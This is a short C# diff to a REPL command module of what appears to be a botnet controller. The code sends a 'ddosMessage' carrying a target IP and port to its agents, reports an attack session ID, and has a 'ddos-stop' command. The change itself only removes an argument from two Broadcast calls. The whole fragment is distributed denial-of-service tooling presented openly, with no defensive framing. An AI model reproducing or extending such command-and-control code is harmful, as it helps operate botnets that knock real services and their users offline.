@@ -90,7 +90,7 @@ namespace REPL.Commands
                     Target = new IPEndPoint(IPAddress.Parse(ip), port),
                     Buffer = Encoding.ASCII.GetBytes(Buffer)
                 };
-                _agent.MessagesManager.Broadcast(ddosMessage, 6);
+                _agent.MessagesManager.Broadcast(ddosMessage);
                 Console.WriteLine($"Attack sessionID {session}");
                 Console.WriteLine($"Stop it using ´ddos-stop {session}´");
                 _repl.AddAutocompletionWords(session.ToString());
@@ -149,7 +149,7 @@ namespace REPL.Commands
                 {
                     AttackId = session
                 };
-                _agent.MessagesManager.Broadcast(ddosStopMessage, 6);
+                _agent.MessagesManager.Broadcast(ddosStopMessage);
                 Console.WriteLine("stopping attack....");
                 return 0;
             }
